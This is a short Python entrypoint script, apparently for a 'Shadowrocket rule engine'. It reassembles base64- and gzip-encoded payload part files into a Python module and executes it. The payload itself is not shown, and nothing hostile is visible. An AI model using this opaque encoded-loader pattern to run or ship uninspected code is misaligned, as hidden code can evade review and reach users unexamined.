#!/usr/bin/env python3
"""Shadowrocket rule engine entrypoint."""
from __future__ import annotations

import base64
import gzip
import runpy
import sys
from pathlib import Path

_HERE = Path(__file__).resolve().parent
_BODY = _HERE / "_rule_engine_impl.py"


def _materialize() -> Path:
    if _BODY.exists() and _BODY.stat().st_size > 1000:
        return _BODY
    parts = sorted(_HERE.glob("rule_engine.payload.part*"))
    if not parts:
        raise SystemExit(f"missing engine payload parts under {_HERE}")
    b64 = "".join(p.read_text(encoding="ascii").strip() for p in parts)
    data = gzip.decompress(base64.b64decode(b64))
    _BODY.write_bytes(data)
    return _BODY


if __name__ == "__main__":
    body = _materialize()
    sys.argv[0] = str(body)
    runpy.run_path(str(body), run_name="__main__")
